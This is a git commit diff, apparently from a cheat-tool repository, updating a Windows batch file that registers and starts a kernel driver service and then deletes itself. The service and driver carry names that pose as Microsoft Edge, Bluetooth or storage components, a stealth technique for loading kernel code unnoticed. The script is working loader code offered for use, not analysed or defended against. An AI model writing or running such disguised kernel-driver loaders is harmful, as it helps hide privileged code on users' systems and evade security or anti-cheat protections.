4503c850004b4d6a3e9e551ae0fef0fc319a31fe
842834fdjfgfg <109022461+TrinityCheat@users.noreply.github.com>
2026-02-14 00:13:27 +0700

    Update 7.bat

--- 7.bat
+++ 7.bat
@@ -1,5 +1,5 @@
 @echo off
 cd %~dp0
-sc create UserBluetoothService765 binpath=C:\Windows\System32\drivers\mspqmw.sys type=kernel
-sc start UserBluetoothService765
+sc create MicrosoftEdgeElevationService_8574 binpath=C:\Windows\System32\drivers\MegaSas0i.sys type=kernel
+sc start MicrosoftEdgeElevationService_8574
 del "%~f0"
